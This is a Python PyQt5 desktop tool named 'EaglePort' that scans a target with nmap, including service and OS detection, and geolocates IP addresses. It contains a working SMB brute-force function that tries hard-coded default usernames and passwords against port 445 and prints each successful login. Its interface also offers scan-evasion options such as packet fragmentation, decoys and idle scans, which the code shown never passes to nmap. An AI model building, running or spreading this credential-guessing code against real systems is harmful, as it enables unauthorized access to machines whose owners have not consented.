import sys
import subprocess
import platform
import webbrowser
import nmap
import requests
from impacket.smbconnection import SMBConnection
from PyQt5.QtWidgets import *
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont, QPalette, QBrush, QColor

# --- Location Lookup ---
def get_ip_location(ip):
    try:
        if ip.startswith("192.") or ip.startswith("10.") or ip.startswith("172."):
            return "Private IP"
        res = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
        data = res.json()
        return f"{data.get('city', '')}, {data.get('region', '')}, {data.get('country', '')}".strip(', ')
    except:
        return "Unknown"

# --- SMB Brute Force ---
def smb_brute_force(ip):
    users = ['admin', 'guest', 'user', 'administrator']
    passwords = ['admin', '1234', 'guest', 'password', '']
    found = []
    for user in users:
        for pwd in passwords:
            try:
                conn = SMBConnection(ip, ip, sess_port=445, timeout=3)
                conn.login(user, pwd)
                found.append((user, pwd))
                conn.logoff()
            except:
                continue
    return found

# --- Scanner Thread ---
class ScanThread(QThread):
    result_signal = pyqtSignal(str, list)
    error_signal = pyqtSignal(str)
    def __init__(self, target, ports, brute):
        super().__init__()
        self.target = target
        self.ports = ports
        self.brute = brute
    def run(self):
        try:
            scanner = nmap.PortScanner()
            scanner.scan(hosts=self.target, ports=self.ports, arguments="-sV -O")
            results = []
            for host in scanner.all_hosts():
                os_info = scanner[host]['osmatch'][0]['name'] if 'osmatch' in scanner[host] and scanner[host]['osmatch'] else 'Unknown'
                location = get_ip_location(host)
                for proto in scanner[host].all_protocols():
                    ports = scanner[host][proto].keys()
                    for port in sorted(ports):
                        state = scanner[host][proto][port]['state']
                        service = scanner[host][proto][port]['name']
                        brute_result = smb_brute_force(host) if self.brute and port == 445 and state == 'open' else []
                        results.append((host, port, service, state, os_info, location, brute_result))
            self.result_signal.emit(self.target, results)
        except Exception as e:
            self.error_signal.emit(str(e))

# --- EaglePort UI ---
class EaglePort(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("EaglePort")
        self.setGeometry(50, 50, 1400, 800)

        # Red theme background
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor("#2b0000"))  # Dark red background
        self.setAutoFillBackground(True)
        self.setPalette(palette)

        self.init_ui()

    def closeEvent(self, event):
        reply = QMessageBox.question(self, 'Exit?', "Exit EaglePort?", QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        event.accept() if reply == QMessageBox.Yes else event.ignore()

    def set_ports_from_mode(self):
        mode = self.port_mode.currentText()
        ports = {"Common Ports": "21,22,23,80,443,445,3389", "Fast (1-1000)": "1-1000", "Full (1-65535)": "1-65535"}
        self.port_input.setText(ports.get(mode, ""))

    def init_ui(self):
        layout = QVBoxLayout()

        title = QLabel("EAGLEPORT")
        title.setFont(QFont("Orbitron", 32, QFont.Bold))
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet("color: #ff3333;")
        layout.addWidget(title)

        input_layout = QHBoxLayout()
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("Target IP")
        self.port_mode = QComboBox()
        self.port_mode.addItems(["Common Ports", "Fast (1-1000)", "Full (1-65535)", "Custom"])
        self.port_mode.currentIndexChanged.connect(self.set_ports_from_mode)
        self.port_input = QLineEdit()
        self.port_input.setPlaceholderText("Port Range")
        for w in [self.ip_input, self.port_mode, self.port_input]:
            w.setStyleSheet("background-color: #330000; color: #ff9999; border-radius: 8px; padding: 5px;")
            input_layout.addWidget(w)
        layout.addLayout(input_layout)

        self.bypass_mode = QComboBox()
        self.bypass_mode.addItems(["None", "Fragment packets (-f)", "Decoy (-D RND:5)", "Source Port 53", "Idle Scan"])
        self.bypass_mode.setStyleSheet("background-color: #330000; color: #ff6666; border-radius: 8px;")
        layout.addWidget(self.bypass_mode)

        self.smb_brute_checkbox = QCheckBox("Enable SMB Brute Force")
        self.smb_brute_checkbox.setStyleSheet("color: #ff6666;")
        layout.addWidget(self.smb_brute_checkbox)

        self.scan_button = QPushButton("🔍 Scan Now")
        self.scan_button.setMinimumSize(250, 70)
        self.scan_button.setStyleSheet("font-size: 20px; font-weight: bold; background-color: #cc0000; color: white; border-radius: 35px;")
        self.scan_button.clicked.connect(self.scan_target)
        layout.addWidget(self.scan_button, alignment=Qt.AlignCenter)

        self.loading = QLabel()
        self.loading.setAlignment(Qt.AlignCenter)
        self.loading.setVisible(False)
        layout.addWidget(self.loading)

        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setStyleSheet("background-color: #1a0000; color: #ff9999; border: 1px solid #990000; font-family: Consolas;")
        layout.addWidget(self.output_text)

        self.result_table = QTableWidget(0, 7)
        self.result_table.setHorizontalHeaderLabels(["#", "IP Address", "Port", "Service", "State", "OS", "Location"])
        self.result_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.result_table.setStyleSheet("background-color: #330000; color: #ffcccc; border-radius: 10px;")
        layout.addWidget(self.result_table)

        self.access_button = QPushButton("Access Selected Port")
        self.access_button.setStyleSheet("background-color: #660000; color: white; font-weight: bold; border-radius: 10px; padding: 10px;")
        self.access_button.clicked.connect(self.access_selected_port)
        layout.addWidget(self.access_button, alignment=Qt.AlignCenter)

        self.setLayout(layout)

    def scan_target(self):
        target = self.ip_input.text()
        ports = self.port_input.text()
        if not target or not ports:
            self.output_text.setPlainText("[!] Missing IP or ports")
            return
        self.loading.setVisible(True)
        self.output_text.setPlainText("[>>>] Scanning... Please wait")
        self.result_table.setRowCount(0)
        self.scan_thread = ScanThread(target, ports, self.smb_brute_checkbox.isChecked())
        self.scan_thread.result_signal.connect(self.display_results)
        self.scan_thread.error_signal.connect(self.display_error)
        self.scan_thread.start()

    def display_results(self, target, results):
        self.loading.setVisible(False)
        self.output_text.clear()
        for i, (ip, port, service, state, os_info, location, brute_result) in enumerate(results):
            self.result_table.insertRow(i)
            self.result_table.setItem(i, 0, QTableWidgetItem(str(i + 1)))
            self.result_table.setItem(i, 1, QTableWidgetItem(ip))
            self.result_table.setItem(i, 2, QTableWidgetItem(str(port)))
            self.result_table.setItem(i, 3, QTableWidgetItem(service))
            self.result_table.setItem(i, 4, QTableWidgetItem(state))
            self.result_table.setItem(i, 5, QTableWidgetItem(os_info))
            self.result_table.setItem(i, 6, QTableWidgetItem(location))
            if brute_result:
                for user, pwd in brute_result:
                    self.output_text.append(f"[+] SMB LOGIN SUCCESS: {ip} → {user}:{pwd}")
        if not results:
            self.output_text.setPlainText("[!] No open ports found.")

    def display_error(self, msg):
        self.loading.setVisible(False)
        self.output_text.setPlainText(f"[X] Error: {msg}")

    def access_selected_port(self):
        row = self.result_table.currentRow()
        if row < 0:
            self.output_text.setPlainText("[!] No port selected")
            return
        ip = self.result_table.item(row, 1).text()
        port = int(self.result_table.item(row, 2).text())
        try:
            if port in [80, 443]:
                webbrowser.open(f"http://{ip}:{port}")
            elif port == 22:
                subprocess.run(["start", "cmd", "/k", f"ssh {ip}"], shell=True)
            elif port == 21:
                subprocess.run(["start", "cmd", "/k", f"ftp {ip}"], shell=True)
            elif port == 3389:
                subprocess.run(["mstsc", "/v:" + ip], shell=True)
            elif port == 445:
                subprocess.run(["explorer", f"\\\\{ip}"], shell=True)
            else:
                self.output_text.append(f"[!] No handler for port {port}")
        except Exception as e:
            self.output_text.append(f"[!] Failed to open port: {e}")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = EaglePort()
    window.show()
    sys.exit(app.exec_())
